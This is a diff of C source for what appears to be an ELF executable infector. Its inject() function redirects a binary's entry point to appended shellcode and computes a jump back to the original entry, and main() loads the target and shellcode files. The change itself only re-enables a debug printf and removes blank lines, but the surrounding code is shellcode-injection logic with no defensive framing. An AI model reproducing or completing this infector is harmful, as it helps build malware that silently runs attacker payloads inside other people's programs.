@@ -81,9 +81,9 @@ char *inject(char *f_buf, char *shellcode, int f_len,int sc_len){
     ehdr->e_entry = new_entry_offs+vaddr_base;
     ehdr->e_shoff += space;
     int64_t j_back_offs = old_entry_offs - (new_entry_offs + sc_len + sh_code_l);
-    /*printf("old_entry_offs: 0x%x , new_entry_offs: 0x%x , sh_len: 0x%x \n"*/
-            /*"j_back_offs: 0x%x \n\n",*/
-            /*old_entry_offs,new_entry_offs,sc_len+sh_code_l,j_back_offs);*/
+    printf("old_entry_offs: 0x%x , new_entry_offs: 0x%x , sh_len: 0x%x \n"
+            "j_back_offs: 0x%x \n\n",
+            old_entry_offs,new_entry_offs,sc_len+sh_code_l,j_back_offs);
     memcpy(sh_code+1,(char*)&j_back_offs,4);
 
     char * infect_buf = malloc(sizeof(char)*(f_len+space));
@@ -113,7 +113,6 @@ int main(int argc,char **argv){
 
     struct stat filestat;
     int sh_size,data_size;
-
     if(fstat(fileno(data),&filestat)){
         perror("fuck");
         exit(1);
@@ -125,7 +124,6 @@ int main(int argc,char **argv){
         exit(1);
     }
     sh_size = filestat.st_size;
-
     char* data_buf = (char*)malloc(sizeof(char)*data_size);
     char* sh_buf = (char*)malloc(sizeof(char)*sh_size);
 
